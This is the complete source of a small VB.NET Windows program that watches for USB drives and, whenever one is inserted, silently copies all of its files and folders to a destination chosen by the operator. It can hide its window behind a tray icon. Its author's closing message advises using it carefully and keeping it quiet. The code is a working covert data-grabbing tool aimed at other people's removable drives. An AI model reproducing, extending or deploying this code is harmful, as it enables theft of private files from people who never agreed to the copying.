Imports System.IO

Public Class Form1
    Dim flag As Boolean
    Dim n As Long
    Public Const WM_DEVICECHANGE = &H219
    Public Const DBT_DEVICEARRIVAL = &H8000
    Public Const DBT_CONFIGCHANGECANCELED = &H19
    Public Const DBT_CONFIGCHANGED = &H18
    Public Const DBT_CUSTOMEVENT = &H8006
    Public Const DBT_DEVICEQUERYREMOVE = &H8001
    Public Const DBT_DEVICEQUERYREMOVEFAILED = &H8002
    Public Const DBT_DEVICEREMOVECOMPLETE = &H8004
    Public Const DBT_DEVICEREMOVEPENDING = &H8003
    Public Const DBT_DEVICETYPESPECIFIC = &H8005
    Public Const DBT_DEVNODES_CHANGED = &H7
    Public Const DBT_QUERYCHANGECONFIG = &H17
    Public Const DBT_USERDEFINED = &HFFFF

    Protected Overrides Sub WndProc(ByRef m As System.Windows.Forms.Message)
        If m.Msg = WM_DEVICECHANGE Then
            Select Case m.WParam
                Case WM_DEVICECHANGE
                Case DBT_DEVICEARRIVAL 'U盘插入
                    Dim s() As DriveInfo = DriveInfo.GetDrives
                    For Each drive As DriveInfo In s
                        If drive.DriveType = DriveType.Removable Then
                            flag = False
                            n = 0
                            ListBox1.Items.Add(TimeString + "  U盘已插入，盘符为：" + drive.Name.ToString)
                            ListBox1.Items.Add(TimeString + "  开始复制")
                            Try
                                CopyDerictory(New DirectoryInfo(drive.Name.ToString()), New DirectoryInfo(TextBox1.Text))
                                flag = True
                            Catch
                                ListBox1.Items.Add(TimeString + "  复制未完成，但仍然复制了" + CStr(n) + "个文件")
                            End Try
                            If flag Then
                                ListBox1.Items.Add(TimeString + "  复制完成，共复制了" + CStr(n) + "个文件")
                            End If
                        End If
                    Next
                Case DBT_CONFIGCHANGECANCELED
                Case DBT_CONFIGCHANGED
                Case DBT_CUSTOMEVENT
                Case DBT_DEVICEQUERYREMOVE
                Case DBT_DEVICEQUERYREMOVEFAILED
                Case DBT_DEVICEREMOVECOMPLETE 'U盘卸载 
                    ListBox1.Items.Add(TimeString + "  U盘已拔出")
                Case DBT_DEVICEREMOVEPENDING
                Case DBT_DEVICETYPESPECIFIC
                Case DBT_DEVNODES_CHANGED
                Case DBT_QUERYCHANGECONFIG
                Case DBT_USERDEFINED
            End Select
        End If

        MyBase.WndProc(m)
    End Sub

    Private Sub Form1_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        NotifyIcon1.Icon = Me.Icon
        ListBox1.Items.Clear()
        ListBox1.Items.Add(TimeString + "  程序开始运行")
    End Sub
    Public Sub CopyDerictory(ByVal DirectorySrc As DirectoryInfo, ByVal DirectoryDes As DirectoryInfo)
        Dim strDirectoryDesPath As String = DirectoryDes.FullName
        If Not Directory.Exists(strDirectoryDesPath) Then
            Directory.CreateDirectory(strDirectoryDesPath)
        End If
        Dim f, fs() As FileInfo
        fs = DirectorySrc.GetFiles()
        For Each f In fs
            File.Copy(f.FullName, strDirectoryDesPath & "" & f.Name, True)
            n = n + 1
        Next
        Dim DirSrc, Dirs() As DirectoryInfo
        Dirs = DirectorySrc.GetDirectories()
        For Each DirSrc In Dirs
            Dim DirDes As New DirectoryInfo(strDirectoryDesPath + DirSrc.ToString + "\")
            CopyDerictory(DirSrc, DirDes)
        Next
    End Sub

    Private Sub Button1_Click(sender As Object, e As EventArgs) Handles Button1.Click
        FolderBrowserDialog1.ShowDialog()
        TextBox1.Text = FolderBrowserDialog1.SelectedPath.ToString + "\"
        ListBox1.Items.Add(TimeString + "  选择储存路径为" + FolderBrowserDialog1.SelectedPath)
    End Sub

    Private Sub Button2_Click(sender As Object, e As EventArgs) Handles Button2.Click
        Me.Visible = False
        NotifyIcon1.Visible = True
        ListBox1.Items.Add(TimeString + "  隐藏窗口")
    End Sub

    Private Sub NotifyIcon1_Click(sender As Object, e As EventArgs) Handles NotifyIcon1.Click
        Me.Visible = True
        NotifyIcon1.Visible = False
        ListBox1.Items.Add(TimeString + "  显示窗口")
    End Sub

    Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
        Me.Close()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click
        MsgBox("作者:AGANG  版本：2.2")
        MsgBox("小心使用，切莫张扬")
    End Sub
End Class